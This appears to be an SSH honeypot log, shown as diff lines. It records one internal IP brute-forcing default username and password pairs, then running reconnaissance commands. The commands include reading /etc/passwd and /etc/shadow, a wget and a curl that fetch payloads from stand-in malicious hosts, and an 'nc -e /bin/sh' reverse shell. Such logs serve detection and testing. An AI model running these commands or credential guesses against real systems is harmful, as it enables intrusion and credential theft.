+2026-02-09 07:54:14,205 - INFO - AUTH_ATTEMPT source_ip=172.20.0.10 user=root pass=123456
+2026-02-09 07:54:14,205 - INFO - Auth granted (password).
+2026-02-09 07:54:14,206 - INFO - BANNER_SENT Ubuntu 20.04
+2026-02-09 07:54:14,250 - INFO - SESSION_END duration=0.08s
+2026-02-09 07:54:15,264 - INFO - NEW_CONNECTION source_ip=172.20.0.10 source_port=59042
+2026-02-09 07:54:15,266 - INFO - Connected (version 2.0, client OpenSSH_10.0p2)
+2026-02-09 07:54:15,274 - INFO - Auth rejected (none).
+2026-02-09 07:54:15,283 - INFO - AUTH_ATTEMPT source_ip=172.20.0.10 user=root pass=admin
+2026-02-09 07:54:15,290 - INFO - Auth granted (password).
+2026-02-09 07:54:15,292 - INFO - BANNER_SENT Ubuntu 20.04
+2026-02-09 07:54:15,343 - INFO - SESSION_END duration=0.08s
+2026-02-09 07:54:16,357 - INFO - NEW_CONNECTION source_ip=172.20.0.10 source_port=59046
+2026-02-09 07:54:16,358 - INFO - Connected (version 2.0, client OpenSSH_10.0p2)
+2026-02-09 07:54:16,412 - INFO - Auth rejected (none).
+2026-02-09 07:54:16,414 - INFO - AUTH_ATTEMPT source_ip=172.20.0.10 user=root pass=root
+2026-02-09 07:54:16,414 - INFO - Auth granted (password).
+2026-02-09 07:54:16,415 - INFO - BANNER_SENT Ubuntu 20.04
+2026-02-09 07:54:16,457 - INFO - SESSION_END duration=0.10s
+2026-02-09 07:54:17,470 - INFO - NEW_CONNECTION source_ip=172.20.0.10 source_port=59058
+2026-02-09 07:54:17,471 - INFO - Connected (version 2.0, client OpenSSH_10.0p2)
+2026-02-09 07:54:17,481 - INFO - Auth rejected (none).
+2026-02-09 07:54:17,482 - INFO - AUTH_ATTEMPT source_ip=172.20.0.10 user=root pass=letmein
+2026-02-09 07:54:17,482 - WARNING - ALERT multiple_failed_logins user=root
+2026-02-09 07:54:17,983 - INFO - Auth rejected (password).
+2026-02-09 07:54:19,000 - INFO - NEW_CONNECTION source_ip=172.20.0.10 source_port=59072
+2026-02-09 07:54:19,001 - INFO - Connected (version 2.0, client OpenSSH_10.0p2)
+2026-02-09 07:54:19,010 - INFO - Auth rejected (none).
+2026-02-09 07:54:19,013 - INFO - AUTH_ATTEMPT source_ip=172.20.0.10 user=root pass=wrongpass
+2026-02-09 07:54:19,013 - WARNING - ALERT multiple_failed_logins user=root
+2026-02-09 07:54:19,513 - INFO - Auth rejected (password).
+2026-02-09 07:54:20,534 - INFO - NEW_CONNECTION source_ip=172.20.0.10 source_port=59088
+2026-02-09 07:54:20,552 - INFO - Connected (version 2.0, client OpenSSH_10.0p2)
+2026-02-09 07:54:20,584 - INFO - Auth rejected (none).
+2026-02-09 07:54:20,586 - INFO - AUTH_ATTEMPT source_ip=172.20.0.10 user=admin pass=password
+2026-02-09 07:54:20,586 - INFO - Auth granted (password).
+2026-02-09 07:54:20,587 - INFO - BANNER_SENT Ubuntu 20.04
+2026-02-09 07:54:20,605 - INFO - CLIENT_DISCONNECTED
+2026-02-09 07:54:20,618 - INFO - SESSION_END duration=0.08s
+2026-02-09 07:54:21,669 - INFO - NEW_CONNECTION source_ip=172.20.0.10 source_port=59092
+2026-02-09 07:54:21,670 - INFO - Connected (version 2.0, client OpenSSH_10.0p2)
+2026-02-09 07:54:21,685 - INFO - Auth rejected (none).
+2026-02-09 07:54:21,704 - INFO - AUTH_ATTEMPT source_ip=172.20.0.10 user=admin pass=123456
+2026-02-09 07:54:21,709 - INFO - Auth granted (password).
+2026-02-09 07:54:21,721 - INFO - BANNER_SENT Ubuntu 20.04
+2026-02-09 07:54:21,763 - INFO - SESSION_END duration=0.09s
+2026-02-09 07:54:22,781 - INFO - NEW_CONNECTION source_ip=172.20.0.10 source_port=59106
+2026-02-09 07:54:22,783 - INFO - Connected (version 2.0, client OpenSSH_10.0p2)
+2026-02-09 07:54:22,790 - INFO - Auth rejected (none).
+2026-02-09 07:54:22,794 - INFO - AUTH_ATTEMPT source_ip=172.20.0.10 user=admin pass=admin
+2026-02-09 07:54:22,794 - INFO - Auth granted (password).
+2026-02-09 07:54:22,798 - INFO - BANNER_SENT Ubuntu 20.04
+2026-02-09 07:54:22,844 - INFO - SESSION_END duration=0.06s
+2026-02-09 07:54:23,881 - INFO - NEW_CONNECTION source_ip=172.20.0.10 source_port=59118
+2026-02-09 07:54:23,882 - INFO - Connected (version 2.0, client OpenSSH_10.0p2)
+2026-02-09 07:54:23,906 - INFO - Auth rejected (none).
+2026-02-09 07:54:23,908 - INFO - AUTH_ATTEMPT source_ip=172.20.0.10 user=admin pass=root
+2026-02-09 07:54:23,908 - INFO - Auth granted (password).
+2026-02-09 07:54:23,915 - INFO - BANNER_SENT Ubuntu 20.04
+2026-02-09 07:54:23,966 - INFO - SESSION_END duration=0.08s
+2026-02-09 07:54:24,979 - INFO - NEW_CONNECTION source_ip=172.20.0.10 source_port=51156
+2026-02-09 07:54:24,981 - INFO - Connected (version 2.0, client OpenSSH_10.0p2)
+2026-02-09 07:54:24,992 - INFO - Auth rejected (none).
+2026-02-09 07:54:24,994 - INFO - AUTH_ATTEMPT source_ip=172.20.0.10 user=admin pass=letmein
+2026-02-09 07:54:24,995 - WARNING - ALERT multiple_failed_logins user=admin
+2026-02-09 07:54:25,496 - INFO - Auth rejected (password).
+2026-02-09 07:54:26,509 - INFO - NEW_CONNECTION source_ip=172.20.0.10 source_port=51160
+2026-02-09 07:54:26,511 - INFO - Connected (version 2.0, client OpenSSH_10.0p2)
+2026-02-09 07:54:26,518 - INFO - Auth rejected (none).
+2026-02-09 07:54:26,520 - INFO - AUTH_ATTEMPT source_ip=172.20.0.10 user=admin pass=wrongpass
+2026-02-09 07:54:26,520 - WARNING - ALERT multiple_failed_logins user=admin
+2026-02-09 07:54:27,023 - INFO - Auth rejected (password).
+2026-02-09 07:54:28,040 - INFO - NEW_CONNECTION source_ip=172.20.0.10 source_port=51166
+2026-02-09 07:54:28,041 - INFO - Connected (version 2.0, client OpenSSH_10.0p2)
+2026-02-09 07:54:28,053 - INFO - Auth rejected (none).
+2026-02-09 07:54:28,054 - INFO - AUTH_ATTEMPT source_ip=172.20.0.10 user=ubuntu pass=password
+2026-02-09 07:54:28,054 - INFO - Auth granted (password).
+2026-02-09 07:54:28,057 - INFO - BANNER_SENT Ubuntu 20.04
+2026-02-09 07:54:28,066 - INFO - SESSION_END duration=0.03s
+2026-02-09 07:54:29,144 - INFO - NEW_CONNECTION source_ip=172.20.0.10 source_port=51182
+2026-02-09 07:54:29,155 - INFO - Connected (version 2.0, client OpenSSH_10.0p2)
+2026-02-09 07:54:29,172 - INFO - Auth rejected (none).
+2026-02-09 07:54:29,176 - INFO - AUTH_ATTEMPT source_ip=172.20.0.10 user=ubuntu pass=123456
+2026-02-09 07:54:29,177 - INFO - Auth granted (password).
+2026-02-09 07:54:29,179 - INFO - BANNER_SENT Ubuntu 20.04
+2026-02-09 07:54:29,223 - INFO - SESSION_END duration=0.07s
+2026-02-09 07:54:30,250 - INFO - NEW_CONNECTION source_ip=172.20.0.10 source_port=51186
+2026-02-09 07:54:30,260 - INFO - Connected (version 2.0, client OpenSSH_10.0p2)
+2026-02-09 07:54:30,367 - INFO - Auth rejected (none).
+2026-02-09 07:54:30,370 - INFO - AUTH_ATTEMPT source_ip=172.20.0.10 user=ubuntu pass=admin
+2026-02-09 07:54:30,370 - INFO - Auth granted (password).
+2026-02-09 07:54:30,371 - INFO - BANNER_SENT Ubuntu 20.04
+2026-02-09 07:54:30,372 - INFO - CLIENT_DISCONNECTED
+2026-02-09 07:54:30,372 - INFO - SESSION_END duration=0.12s
+2026-02-09 07:54:31,388 - INFO - NEW_CONNECTION source_ip=172.20.0.10 source_port=51188
+2026-02-09 07:54:31,391 - INFO - Connected (version 2.0, client OpenSSH_10.0p2)
+2026-02-09 07:54:31,406 - INFO - Auth rejected (none).
+2026-02-09 07:54:31,412 - INFO - AUTH_ATTEMPT source_ip=172.20.0.10 user=ubuntu pass=root
+2026-02-09 07:54:31,413 - INFO - Auth granted (password).
+2026-02-09 07:54:31,415 - INFO - BANNER_SENT Ubuntu 20.04
+2026-02-09 07:54:31,469 - INFO - SESSION_END duration=0.08s
+2026-02-09 07:54:32,491 - INFO - NEW_CONNECTION source_ip=172.20.0.10 source_port=51192
+2026-02-09 07:54:32,493 - INFO - Connected (version 2.0, client OpenSSH_10.0p2)
+2026-02-09 07:54:32,503 - INFO - Auth rejected (none).
+2026-02-09 07:54:32,507 - INFO - AUTH_ATTEMPT source_ip=172.20.0.10 user=ubuntu pass=letmein
+2026-02-09 07:54:32,507 - WARNING - ALERT multiple_failed_logins user=ubuntu
+2026-02-09 07:54:33,008 - INFO - Auth rejected (password).
+2026-02-09 07:54:34,024 - INFO - NEW_CONNECTION source_ip=172.20.0.10 source_port=51208
+2026-02-09 07:54:34,025 - INFO - Connected (version 2.0, client OpenSSH_10.0p2)
+2026-02-09 07:54:34,034 - INFO - Auth rejected (none).
+2026-02-09 07:54:34,043 - INFO - AUTH_ATTEMPT source_ip=172.20.0.10 user=ubuntu pass=wrongpass
+2026-02-09 07:54:34,045 - WARNING - ALERT multiple_failed_logins user=ubuntu
+2026-02-09 07:54:34,547 - INFO - Auth rejected (password).
+2026-02-09 07:54:35,567 - INFO - NEW_CONNECTION source_ip=172.20.0.10 source_port=60440
+2026-02-09 07:54:35,568 - INFO - Connected (version 2.0, client OpenSSH_10.0p2)
+2026-02-09 07:54:35,575 - INFO - Auth rejected (none).
+2026-02-09 07:54:35,577 - INFO - AUTH_ATTEMPT source_ip=172.20.0.10 user=test pass=password
+2026-02-09 07:54:35,577 - INFO - Auth granted (password).
+2026-02-09 07:54:35,578 - INFO - BANNER_SENT Ubuntu 20.04
+2026-02-09 07:54:35,579 - INFO - SESSION_END duration=0.01s
+2026-02-09 07:54:36,596 - INFO - NEW_CONNECTION source_ip=172.20.0.10 source_port=60444
+2026-02-09 07:54:36,603 - INFO - Connected (version 2.0, client OpenSSH_10.0p2)
+2026-02-09 07:54:36,634 - INFO - Auth rejected (none).
+2026-02-09 07:54:36,634 - INFO - AUTH_ATTEMPT source_ip=172.20.0.10 user=test pass=123456
+2026-02-09 07:54:36,635 - INFO - Auth granted (password).
+2026-02-09 07:54:36,639 - INFO - BANNER_SENT Ubuntu 20.04
+2026-02-09 07:54:36,652 - INFO - SESSION_END duration=0.06s
+2026-02-09 07:54:37,687 - INFO - NEW_CONNECTION source_ip=172.20.0.10 source_port=60452
+2026-02-09 07:54:37,691 - INFO - Connected (version 2.0, client OpenSSH_10.0p2)
+2026-02-09 07:54:37,719 - INFO - Auth rejected (none).
+2026-02-09 07:54:37,730 - INFO - AUTH_ATTEMPT source_ip=172.20.0.10 user=test pass=admin
+2026-02-09 07:54:37,730 - INFO - Auth granted (password).
+2026-02-09 07:54:37,746 - INFO - BANNER_SENT Ubuntu 20.04
+2026-02-09 07:54:37,762 - INFO - SESSION_END duration=0.08s
+2026-02-09 07:54:38,787 - INFO - NEW_CONNECTION source_ip=172.20.0.10 source_port=60468
+2026-02-09 07:54:38,788 - INFO - Connected (version 2.0, client OpenSSH_10.0p2)
+2026-02-09 07:54:38,794 - INFO - Auth rejected (none).
+2026-02-09 07:54:38,797 - INFO - AUTH_ATTEMPT source_ip=172.20.0.10 user=test pass=root
+2026-02-09 07:54:38,797 - INFO - Auth granted (password).
+2026-02-09 07:54:38,799 - INFO - BANNER_SENT Ubuntu 20.04
+2026-02-09 07:54:38,844 - INFO - SESSION_END duration=0.06s
+2026-02-09 07:54:39,866 - INFO - NEW_CONNECTION source_ip=172.20.0.10 source_port=60470
+2026-02-09 07:54:39,867 - INFO - Connected (version 2.0, client OpenSSH_10.0p2)
+2026-02-09 07:54:39,895 - INFO - Auth rejected (none).
+2026-02-09 07:54:39,897 - INFO - AUTH_ATTEMPT source_ip=172.20.0.10 user=test pass=letmein
+2026-02-09 07:54:39,897 - WARNING - ALERT multiple_failed_logins user=test
+2026-02-09 07:54:40,400 - INFO - Auth rejected (password).
+2026-02-09 07:54:41,418 - INFO - NEW_CONNECTION source_ip=172.20.0.10 source_port=60486
+2026-02-09 07:54:41,419 - INFO - Connected (version 2.0, client OpenSSH_10.0p2)
+2026-02-09 07:54:41,427 - INFO - Auth rejected (none).
+2026-02-09 07:54:41,429 - INFO - AUTH_ATTEMPT source_ip=172.20.0.10 user=test pass=wrongpass
+2026-02-09 07:54:41,430 - WARNING - ALERT multiple_failed_logins user=test
+2026-02-09 07:54:41,931 - INFO - Auth rejected (password).
+2026-02-09 07:54:42,951 - INFO - NEW_CONNECTION source_ip=172.20.0.10 source_port=60494
+2026-02-09 07:54:42,952 - INFO - Connected (version 2.0, client OpenSSH_10.0p2)
+2026-02-09 07:54:42,962 - INFO - Auth rejected (none).
+2026-02-09 07:54:42,964 - INFO - AUTH_ATTEMPT source_ip=172.20.0.10 user=nobody pass=password
+2026-02-09 07:54:42,965 - WARNING - ALERT multiple_failed_logins user=nobody
+2026-02-09 07:54:43,465 - INFO - Auth rejected (password).
+2026-02-09 07:54:44,481 - INFO - NEW_CONNECTION source_ip=172.20.0.10 source_port=52200
+2026-02-09 07:54:44,482 - INFO - Connected (version 2.0, client OpenSSH_10.0p2)
+2026-02-09 07:54:44,489 - INFO - Auth rejected (none).
+2026-02-09 07:54:44,492 - INFO - AUTH_ATTEMPT source_ip=172.20.0.10 user=nobody pass=123456
+2026-02-09 07:54:44,492 - WARNING - ALERT multiple_failed_logins user=nobody
+2026-02-09 07:54:44,994 - INFO - Auth rejected (password).
+2026-02-09 07:54:46,010 - INFO - NEW_CONNECTION source_ip=172.20.0.10 source_port=52204
+2026-02-09 07:54:46,019 - INFO - Connected (version 2.0, client OpenSSH_10.0p2)
+2026-02-09 07:54:46,030 - INFO - Auth rejected (none).
+2026-02-09 07:54:46,033 - INFO - AUTH_ATTEMPT source_ip=172.20.0.10 user=nobody pass=admin
+2026-02-09 07:54:46,034 - WARNING - ALERT multiple_failed_logins user=nobody
+2026-02-09 07:54:46,535 - INFO - Auth rejected (password).
+2026-02-09 07:54:47,551 - INFO - NEW_CONNECTION source_ip=172.20.0.10 source_port=52208
+2026-02-09 07:54:47,553 - INFO - Connected (version 2.0, client OpenSSH_10.0p2)
+2026-02-09 07:54:47,565 - INFO - Auth rejected (none).
+2026-02-09 07:54:47,567 - INFO - AUTH_ATTEMPT source_ip=172.20.0.10 user=nobody pass=root
+2026-02-09 07:54:47,567 - WARNING - ALERT multiple_failed_logins user=nobody
+2026-02-09 07:54:48,069 - INFO - Auth rejected (password).
+2026-02-09 07:54:49,162 - INFO - NEW_CONNECTION source_ip=172.20.0.10 source_port=52214
+2026-02-09 07:54:49,163 - INFO - Connected (version 2.0, client OpenSSH_10.0p2)
+2026-02-09 07:54:49,173 - INFO - Auth rejected (none).
+2026-02-09 07:54:49,180 - INFO - AUTH_ATTEMPT source_ip=172.20.0.10 user=nobody pass=letmein
+2026-02-09 07:54:49,180 - WARNING - ALERT multiple_failed_logins user=nobody
+2026-02-09 07:54:49,685 - INFO - Auth rejected (password).
+2026-02-09 07:54:49,689 - INFO - AUTH_ATTEMPT source_ip=172.20.0.10 user=nobody pass=
+2026-02-09 07:54:49,689 - WARNING - ALERT multiple_failed_logins user=nobody
+2026-02-09 07:54:50,190 - INFO - Auth rejected (password).
+2026-02-09 07:54:50,703 - INFO - NEW_CONNECTION source_ip=172.20.0.10 source_port=52218
+2026-02-09 07:54:50,704 - INFO - Connected (version 2.0, client OpenSSH_10.0p2)
+2026-02-09 07:54:50,719 - INFO - Auth rejected (none).
+2026-02-09 07:54:50,735 - INFO - AUTH_ATTEMPT source_ip=172.20.0.10 user=nobody pass=wrongpass
+2026-02-09 07:54:50,735 - WARNING - ALERT multiple_failed_logins user=nobody
+2026-02-09 07:54:51,237 - INFO - Auth rejected (password).
+2026-02-09 07:54:52,255 - INFO - NEW_CONNECTION source_ip=172.20.0.10 source_port=52228
+2026-02-09 07:54:52,256 - INFO - Connected (version 2.0, client OpenSSH_10.0p2)
+2026-02-09 07:54:52,274 - INFO - Auth rejected (none).
+2026-02-09 07:54:52,277 - INFO - AUTH_ATTEMPT source_ip=172.20.0.10 user=admin pass=password
+2026-02-09 07:54:52,277 - INFO - Auth granted (password).
+2026-02-09 07:54:52,277 - INFO - BANNER_SENT Ubuntu 20.04
+2026-02-09 07:54:52,278 - INFO - COMMAND source_ip=172.20.0.10 cmd="whoami
+    exit"
+2026-02-09 07:54:52,280 - INFO - SESSION_END duration=0.02s
+2026-02-09 07:54:53,360 - INFO - NEW_CONNECTION source_ip=172.20.0.10 source_port=52242
+2026-02-09 07:54:53,361 - INFO - Connected (version 2.0, client OpenSSH_10.0p2)
+2026-02-09 07:54:53,372 - INFO - Auth rejected (none).
+2026-02-09 07:54:53,373 - INFO - AUTH_ATTEMPT source_ip=172.20.0.10 user=admin pass=password
+2026-02-09 07:54:53,379 - INFO - Auth granted (password).
+2026-02-09 07:54:53,380 - INFO - BANNER_SENT Ubuntu 20.04
+2026-02-09 07:54:53,384 - INFO - COMMAND source_ip=172.20.0.10 cmd="pwd
+    exit"
+2026-02-09 07:54:53,385 - INFO - SESSION_END duration=0.02s
+2026-02-09 07:54:54,445 - INFO - NEW_CONNECTION source_ip=172.20.0.10 source_port=34212
+2026-02-09 07:54:54,447 - INFO - Connected (version 2.0, client OpenSSH_10.0p2)
+2026-02-09 07:54:54,456 - INFO - Auth rejected (none).
+2026-02-09 07:54:54,458 - INFO - AUTH_ATTEMPT source_ip=172.20.0.10 user=admin pass=password
+2026-02-09 07:54:54,460 - INFO - Auth granted (password).
+2026-02-09 07:54:54,462 - INFO - BANNER_SENT Ubuntu 20.04
+2026-02-09 07:54:54,465 - INFO - COMMAND source_ip=172.20.0.10 cmd="ls
+    exit"
+2026-02-09 07:54:54,465 - INFO - SESSION_END duration=0.02s
+2026-02-09 07:54:55,531 - INFO - NEW_CONNECTION source_ip=172.20.0.10 source_port=34218
+2026-02-09 07:54:55,533 - INFO - Connected (version 2.0, client OpenSSH_10.0p2)
+2026-02-09 07:54:55,553 - INFO - Auth rejected (none).
+2026-02-09 07:54:55,564 - INFO - AUTH_ATTEMPT source_ip=172.20.0.10 user=admin pass=password
+2026-02-09 07:54:55,564 - INFO - Auth granted (password).
+2026-02-09 07:54:55,567 - INFO - BANNER_SENT Ubuntu 20.04
+2026-02-09 07:54:55,570 - INFO - COMMAND source_ip=172.20.0.10 cmd="ls /
+    exit"
+2026-02-09 07:54:55,570 - INFO - SESSION_END duration=0.04s
+2026-02-09 07:54:56,627 - INFO - NEW_CONNECTION source_ip=172.20.0.10 source_port=34222
+2026-02-09 07:54:56,628 - INFO - Connected (version 2.0, client OpenSSH_10.0p2)
+2026-02-09 07:54:56,648 - INFO - Auth rejected (none).
+2026-02-09 07:54:56,649 - INFO - AUTH_ATTEMPT source_ip=172.20.0.10 user=admin pass=password
+2026-02-09 07:54:56,649 - INFO - Auth granted (password).
+2026-02-09 07:54:56,650 - INFO - BANNER_SENT Ubuntu 20.04
+2026-02-09 07:54:56,650 - INFO - COMMAND source_ip=172.20.0.10 cmd="ls /etc
+    exit"
+2026-02-09 07:54:56,651 - INFO - SESSION_END duration=0.02s
+2026-02-09 07:54:57,706 - INFO - NEW_CONNECTION source_ip=172.20.0.10 source_port=34238
+2026-02-09 07:54:57,712 - INFO - Connected (version 2.0, client OpenSSH_10.0p2)
+2026-02-09 07:54:57,754 - INFO - Auth rejected (none).
+2026-02-09 07:54:57,761 - INFO - AUTH_ATTEMPT source_ip=172.20.0.10 user=admin pass=password
+2026-02-09 07:54:57,763 - INFO - Auth granted (password).
+2026-02-09 07:54:57,777 - INFO - BANNER_SENT Ubuntu 20.04
+2026-02-09 07:54:57,783 - INFO - COMMAND source_ip=172.20.0.10 cmd="cd /etc && ls
+    exit"
+2026-02-09 07:54:57,789 - INFO - SESSION_END duration=0.08s
+2026-02-09 07:54:58,851 - INFO - NEW_CONNECTION source_ip=172.20.0.10 source_port=34246
+2026-02-09 07:54:58,852 - INFO - Connected (version 2.0, client OpenSSH_10.0p2)
+2026-02-09 07:54:58,860 - INFO - Auth rejected (none).
+2026-02-09 07:54:58,865 - INFO - AUTH_ATTEMPT source_ip=172.20.0.10 user=admin pass=password
+2026-02-09 07:54:58,865 - INFO - Auth granted (password).
+2026-02-09 07:54:58,881 - INFO - BANNER_SENT Ubuntu 20.04
+2026-02-09 07:54:58,881 - INFO - COMMAND source_ip=172.20.0.10 cmd="uname -a
+    exit"
+2026-02-09 07:54:58,881 - INFO - SESSION_END duration=0.03s
+2026-02-09 07:54:59,984 - INFO - NEW_CONNECTION source_ip=172.20.0.10 source_port=34258
+2026-02-09 07:54:59,986 - INFO - Connected (version 2.0, client OpenSSH_10.0p2)
+2026-02-09 07:54:59,996 - INFO - Auth rejected (none).
+2026-02-09 07:55:00,005 - INFO - AUTH_ATTEMPT source_ip=172.20.0.10 user=admin pass=password
+2026-02-09 07:55:00,008 - INFO - Auth granted (password).
+2026-02-09 07:55:00,025 - INFO - BANNER_SENT Ubuntu 20.04
+2026-02-09 07:55:00,027 - INFO - COMMAND source_ip=172.20.0.10 cmd="cat /etc/passwd
+    exit"
+2026-02-09 07:55:00,027 - INFO - SESSION_END duration=0.04s
+2026-02-09 07:55:01,111 - INFO - NEW_CONNECTION source_ip=172.20.0.10 source_port=34272
+2026-02-09 07:55:01,112 - INFO - Connected (version 2.0, client OpenSSH_10.0p2)
+2026-02-09 07:55:01,122 - INFO - Auth rejected (none).
+2026-02-09 07:55:01,124 - INFO - AUTH_ATTEMPT source_ip=172.20.0.10 user=admin pass=password
+2026-02-09 07:55:01,124 - INFO - Auth granted (password).
+2026-02-09 07:55:01,126 - INFO - BANNER_SENT Ubuntu 20.04
+2026-02-09 07:55:01,128 - INFO - COMMAND source_ip=172.20.0.10 cmd="ls; whoami
+    exit"
+2026-02-09 07:55:01,129 - INFO - SESSION_END duration=0.02s
+2026-02-09 07:55:02,190 - INFO - NEW_CONNECTION source_ip=172.20.0.10 source_port=34286
+2026-02-09 07:55:02,191 - INFO - Connected (version 2.0, client OpenSSH_10.0p2)
+2026-02-09 07:55:02,201 - INFO - Auth rejected (none).
+2026-02-09 07:55:02,202 - INFO - AUTH_ATTEMPT source_ip=172.20.0.10 user=admin pass=password
+2026-02-09 07:55:02,204 - INFO - Auth granted (password).
+2026-02-09 07:55:02,214 - INFO - BANNER_SENT Ubuntu 20.04
+2026-02-09 07:55:02,233 - INFO - COMMAND source_ip=172.20.0.10 cmd="whoami && uname -a
+    exit"
+2026-02-09 07:55:02,233 - INFO - SESSION_END duration=0.04s
+2026-02-09 07:55:03,329 - INFO - NEW_CONNECTION source_ip=172.20.0.10 source_port=34302
+2026-02-09 07:55:03,329 - INFO - Connected (version 2.0, client OpenSSH_10.0p2)
+2026-02-09 07:55:03,365 - INFO - Auth rejected (none).
+2026-02-09 07:55:03,367 - INFO - AUTH_ATTEMPT source_ip=172.20.0.10 user=admin pass=password
+2026-02-09 07:55:03,368 - INFO - Auth granted (password).
+2026-02-09 07:55:03,369 - INFO - BANNER_SENT Ubuntu 20.04
+2026-02-09 07:55:03,384 - INFO - COMMAND source_ip=172.20.0.10 cmd="cat /etc/shadow
+    exit"
+2026-02-09 07:55:03,386 - INFO - SESSION_END duration=0.06s
+2026-02-09 07:55:04,481 - INFO - NEW_CONNECTION source_ip=172.20.0.10 source_port=54866
+2026-02-09 07:55:04,482 - INFO - Connected (version 2.0, client OpenSSH_10.0p2)
+2026-02-09 07:55:04,494 - INFO - Auth rejected (none).
+2026-02-09 07:55:04,498 - INFO - AUTH_ATTEMPT source_ip=172.20.0.10 user=admin pass=password
+2026-02-09 07:55:04,503 - INFO - Auth granted (password).
+2026-02-09 07:55:04,515 - INFO - BANNER_SENT Ubuntu 20.04
+2026-02-09 07:55:04,517 - INFO - COMMAND source_ip=172.20.0.10 cmd="wget http://malicious.site/payload.sh
+    exit"
+2026-02-09 07:55:04,518 - INFO - SESSION_END duration=0.04s
+2026-02-09 07:55:05,582 - INFO - NEW_CONNECTION source_ip=172.20.0.10 source_port=54870
+2026-02-09 07:55:05,583 - INFO - Connected (version 2.0, client OpenSSH_10.0p2)
+2026-02-09 07:55:05,594 - INFO - Auth rejected (none).
+2026-02-09 07:55:05,598 - INFO - AUTH_ATTEMPT source_ip=172.20.0.10 user=admin pass=password
+2026-02-09 07:55:05,598 - INFO - Auth granted (password).
+2026-02-09 07:55:05,600 - INFO - BANNER_SENT Ubuntu 20.04
+2026-02-09 07:55:05,602 - INFO - COMMAND source_ip=172.20.0.10 cmd="curl http://bad.site/exploit
+    exit"
+2026-02-09 07:55:05,603 - INFO - SESSION_END duration=0.02s
+2026-02-09 07:55:06,666 - INFO - NEW_CONNECTION source_ip=172.20.0.10 source_port=54878
+2026-02-09 07:55:06,667 - INFO - Connected (version 2.0, client OpenSSH_10.0p2)
+2026-02-09 07:55:06,682 - INFO - Auth rejected (none).
+2026-02-09 07:55:06,684 - INFO - AUTH_ATTEMPT source_ip=172.20.0.10 user=admin pass=password
+2026-02-09 07:55:06,684 - INFO - Auth granted (password).
+2026-02-09 07:55:06,686 - INFO - BANNER_SENT Ubuntu 20.04
+2026-02-09 07:55:06,687 - INFO - COMMAND source_ip=172.20.0.10 cmd="nc -e /bin/sh 1.2.3.4 4444
+    exit"
+2026-02-09 07:55:06,688 - INFO - SESSION_END duration=0.02s
